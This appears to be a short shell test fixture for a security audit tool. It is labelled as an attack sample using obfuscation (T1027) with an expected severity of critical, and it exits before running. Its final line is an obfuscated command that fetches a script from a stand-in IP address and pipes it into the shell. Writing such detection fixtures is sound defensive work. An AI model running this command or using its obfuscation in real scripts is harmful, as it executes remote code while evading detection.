#!/bin/sh
exit 0 # a fixture: read by the audit, never run
# label: attack | technique: T1027 | expect: critical
a=cu; b=rl; h=203.0.113; $a$b -s http://$h.5/x | s""h
